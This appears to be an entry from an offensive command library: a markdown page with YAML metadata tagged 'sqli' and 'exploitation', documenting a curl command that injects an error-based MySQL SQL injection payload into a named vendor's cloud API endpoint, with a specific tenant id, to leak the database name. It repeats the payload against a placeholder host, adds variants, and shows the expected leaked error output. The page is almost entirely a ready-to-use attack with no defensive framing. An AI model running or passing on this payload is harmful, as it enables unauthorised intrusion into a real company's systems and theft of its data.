---
id: 123e4567-e89b-12d3-a456-426614174003
name: curl-sqli-database-leak
type: command
executor: bash
data: >-
  curl -X GET
  "https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent'%20and%2F%2A%2A%2Fextractvalue(1,concat(char(126),(select%20database())))%20and'%20"
  -v
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.135Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - sqli
  - exploitation
verified: false
validated: true
submitted: true
---

# curl-sqli-database-leak

## Command

```bash
curl -X GET "https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent'%20and%2F%2A%2A%2Fextractvalue(1,concat(char(126),(select%20database())))%20and'%20" -v
```

## Description

This curl command sends a GET request to exploit SQL injection in the Acronis API, using an error-based payload to leak the database name via MySQL extractvalue error.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| URL with params | Full endpoint with injected 'unit' payload | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=1590228&unit=atp-agent'%20and%2F%2A%2A%2Fextractvalue(1,concat(char(126),(select%20database())))%20and'%20" -v
```

### Advanced Usage

Add headers for proxy or auth if needed:

```bash
curl -X GET -H "User-Agent: Mozilla/5.0" "https://target.com/api/agent_manager/v2/unit_configurations?..." -v
```

## Expected Output

HTTP response with 500-like error body containing SQL exception, e.g., "XPATH syntax error: '~acronis_db'" indicating successful leak.

## Related

- [[Related Procedure: Error-Based-SQL-Injection-to-Leak-Database-Name]]
